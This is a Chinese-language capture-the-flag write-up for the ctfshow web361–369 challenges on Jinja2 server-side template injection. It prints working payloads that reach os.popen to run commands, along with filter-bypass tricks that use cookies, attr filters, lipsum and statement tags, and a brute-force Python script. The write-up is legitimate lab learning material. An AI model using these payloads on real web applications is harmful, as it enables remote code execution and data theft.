# ctfshow-web入门361-372通关

# web361

打开ssti靶场看到下面这个页面![image](assets/image-20250415221211-fw31jrx.png)

感觉应该是有回显的，但是没有找到回显在哪，查看网页源代码也没有找到传参的参数名是什么，可以先猜测name，flag，file等等，但是我为了方便直接用arjun进行参数检测

![image](assets/image-20250415221511-3nfrbv4.png)

发现参数名为name，之后进行name传参，先尝试{{7*7}}查看是否会执行我们所传的参数，发现回显49.所以存在ssti模块注入

## 方法一：直接用tplmap工具进行

![image](assets/image-20250415221720-lkrwxyw.png)

![image](assets/image-20250415221738-qlrg9xo.png)

输入命令cat /flag，发现flag

## 方法二：

先使用payload查看所有类

![image](assets/image-20250415225459-qqwhkh7.png)

将所有类复制放在notepad++上

![image](assets/image-20250415225658-vlzl36r.png)

将所有，换成\n在查找os类，发现在133行，再在payload上面改132，因为subclasses[]从0开始

![image](assets/image-20250415230317-mj5cfzn.png)

发现flag，这里的__init__.__global__["popen"]\\\("执行的命令").read()为固定的搭配

# web362：

![image](assets/image-20250416204221-by2czvi.png)

上题检测出参数名为name，直接用name进行测试，测试不出来继续用arjun进行检测，这里发现还是这个参数名，依旧用{{7*7}}看是否存在注入点，发现执行命令，再用上题的命令测试

![image](assets/image-20250416204551-ids87c4.png)

之后步骤和方法二一样放在notepad++中查找所要的参数所在的行，发现在132行中

![image](assets/image-20250416204745-62hq7ca.png)

结果回显是这个，和上一题的回显不一样

再用上个payload进行尝试，发现没有flag出现?name={{%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__[%27os%27][%27popen%27](%27cat%20/flag)}}

![image](assets/image-20250416205522-bqaqmw6.png)

猜测应该是过滤了某些参数

咱们直接尝试通过url_for调用os模块

直接尝试{{url_for.__globals__.os.popen('cat /flag').read()}}

![image](assets/image-20250416205726-9dtjhyz.png)

发现flag：ctfshow{11132bf0-23ca-449c-a8d1-bbf40cda2e8d}

‍

# web363

前几步与前两题步骤一致

但是在进行查看类的时候发现没有子类回显，那咱们换一种返回的数据类型"也不行应该是过滤了单双引号，换成[]试试，''和[]只是返回的数据类型不同，本质上没有区别

发现有回显

![image](assets/image-20250416211649-gv4zjfn.png)

接下来的步骤和上面基本一致，仍然是查找子类

直接用已经加载os模块的子类调用os模块，然后用request方法，就是调用request.args.a(这里的a可以换成任何数字字符，自定义的变量，可以任意设置)就像是传参一样

​`？name{{config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read()}}&a=os&b=cat /flag`​

![image](assets/image-20250416220115-swbqg1e.png)

发现flag：ctfshow{d0fa332c-60fa-47d2-9c08-c43eee78c791}

注：还有char方法可以解决单双引号过滤，这里不过多讲述

# web364

前面步骤一致

在使用上题的payload发现没有回显，猜测应该是把args给过滤了，那就换成cookie进行注入

payload：{{url_for.__globals__[request.cookies.a][request.cookies.b]\\\(request.cookie.c).read()}}

cookie传参：a = os;b = popen ; c=cat /flag

# web365

前面步骤一样，但是发现查看子类的时候没有回显，猜测应该是过滤了[]或者()，那么先进行[]的替换试试，把[]换成()试试，发现可以

到查看具体子类时直接使用__getitem__()绕过[],发现出现了os模块

![image](assets/image-20250417141732-dkydw8c.png)

直接构造payload:{{().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.a).read()}}

但是还有没有其他过滤也不清楚，上面因为是web入门按照循序渐进的方式进行加大难度的，所以应该就添加了这一个过滤，其他的我就没考虑了，如果要查看更多的过滤，可以造个字典进行测试，具体方法在下面一题说

# web366

![image](assets/image-20250417143841-uwfqbmj.png)

‍

试了几个payload，没发现有回显，换了一个类型也没回显，应该过滤不在这里，直接用字典进行过滤检测

![image](assets/image-20250417152529-ol32h99.png)

发现__,args,[,',"被过滤,使用|+attr+request绕过

```undefined
#同时
{{()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')|attr(request.values.name5)()}}
post:
name1=__class__&name2=__base__&name3=__subclasses__&name4=pop&name5=read

```

发现没有回显，后来又想到lipsum模块下也有os模块

使用lipsum模块进行尝试，payload如下：`/?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}`​

![image](assets/image-20250417155123-bzuw5pn.png)

# web367

再次用字典测试过滤字符：_,[,',",os,args

但是os由cookie传进去就绕过过滤了，所以把payload改一下`/?name={{(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read()}}`​

​`cookie:a = __globals__;b=cat /flag; c=os`​

找到flag：ctfshow{0bbeb384-1a7a-4f3b-804c-dd9e24700932}

![image](assets/image-20250417201233-yw3ymr3.png)

# web368

此次过滤[,{{,",os,args,_,考察方式同上

将{{}}改成{%%}进行注入，具体文章看

[www.freebuf.com/articles/web/359392.html](https://www.freebuf.com/articles/web/359392.html)

payload如下：`http://96a474f4-9902-4b71-b0e4-e39163bcdbdf.challenge.ctf.show/?name={%print((lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read())%}`​

cookie：`a = __globals__;b=cat /flag; c=os`​

![image](assets/image-20250417210012-41b1ix7.png)

或者`{%((lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read())%}1{% endif %}`​

# web369

fuzz测试增加了过滤request

```undefined
# anthor:秀儿
import requests
url="http://ac6e1d67-01fa-414d-8622-ab71706a7dca.chall.ctf.show:8080/?name={
   {% print (config|string|list).pop({}).lower() %}}"

payload="cat /flag"
result=""
for j in payload:
    for i in range(0,1000):
        r=requests.get(url=url.format(i))
        location=r.text.find("<h3>")
        word=r.text[location+4:location+5]
        if word==j.lower():
            print("(config|string|list).pop(%d).lower() == %s"%(i,j))
            result+="(config|string|list).pop(%d).lower()~"%(i)
            break
print(result[:len(result)-1])

```

太难了,没想到什么办法就看了官方给的wp，自己写的脚本也没写完

‍

‍
